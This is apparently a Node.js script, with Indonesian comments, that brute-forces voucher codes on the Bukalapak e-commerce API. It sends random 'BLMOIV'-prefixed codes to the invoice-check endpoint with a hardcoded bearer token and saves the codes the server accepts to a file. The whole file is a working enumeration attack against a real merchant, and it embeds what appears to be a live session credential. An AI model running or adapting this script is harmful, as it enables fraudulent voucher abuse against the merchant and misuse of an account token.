////UBAH JUMLAH DI LINE 52//////
////Made with <3 by osyduck////


const request = require("request");
const randomstring = require("randomstring");
const fs = require('async-file');
function gas(kode){
var options = { method: 'POST',
  url: 'https://api.bukalapak.com/invoices/check',
  headers: 
   { 'postman-token': '2cf788a3-9180-cd1b-ca12-6f528fc582ff',
     'cache-control': 'no-cache',
     'accept-language': 'en-US,en;q=0.9',
     referer: 'https://www.bukalapak.com/payment/invoices/974927857/edit_payment',
     'content-type': 'application/json',
     'x-request-id': '1c366904-5c60-b044-3969-9d25ec064c59',
     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36',
     authorization: 'bearer bbb167186f87699e4a85e967a04e9b2a8720bc0d3a96d60a318a816c5211ac24',
     origin: 'https://www.bukalapak.com',
     accept: 'application/json, text/javascript, */*; q=0.01',
     connection: 'keep-alive',
     host: 'api.bukalapak.com' },
  body: 
   { id: 974927857,
     invoice_id: 974927857,
     voucher_code: kode,
     payment_type: 'transfer',
     priority_buyer_reduction: false,
     transactions: [ { id: 1204963572, type: 'product' } ],
     payment_details: { virtual_account_type: '' },
     request_id: '1c366904-5c60-b044-3969-9d25ec064c59' },
  json: true };

request(options, function (error, response, body) {
  if (error) throw new Error(error);
  //
    const json = JSON.stringify(body);
    const parse= JSON.parse(json);
    const msg  = parse.errors[0].message;
    if(msg == "Voucher hanya berlaku untuk transaksi di Aplikasi Android Bukalapak dan Aplikasi iOS Bukalapak"){
    fs.appendFile('live_bukalapak.txt', `${kode} => Valid!\n`, 'utf-8');
    console.log("Live "+kode);
  }else{
    console.log("Die "+kode);
  }

});
}
///////EDIT DISINI AJA COK JUMLAHNYA//////

var jumlah = 10;

///////MAX ISI 10 AJA JANGAN MARUK!//////

var i;
for (i = 0; i < jumlah; i++) {
var kode = randomstring.generate({
  length: 4,
  charset: 'alphanumeric',
  capitalization: 'uppercase'
});

gas("BLMOIV"+kode);
//delay(10000);
}
